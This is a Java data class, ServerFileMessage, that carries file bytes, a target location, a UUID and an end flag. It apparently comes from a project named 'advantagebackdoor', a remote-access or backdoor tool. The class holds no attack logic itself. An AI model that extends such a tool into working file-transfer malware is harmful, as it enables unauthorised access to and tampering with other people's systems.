package me.faintcloudy.advantagebackdoor.api.message.play.server;

import com.alibaba.fastjson.annotation.JSONField;
import me.faintcloudy.advantagebackdoor.api.message.SimpleNetworkMessage;

import java.util.UUID;

public class ServerFileMessage extends SimpleNetworkMessage {
    @JSONField
    public byte[] file;
    @JSONField
    public String location;
    @JSONField
    public UUID uuid;
    @JSONField
    public boolean end;

    public ServerFileMessage(byte[] file, UUID uuid, boolean end, String location)
    {
        this.file = file;
        this.uuid = uuid;
        this.end = end;
        this.location = location;
    }

    public ServerFileMessage() {}
}
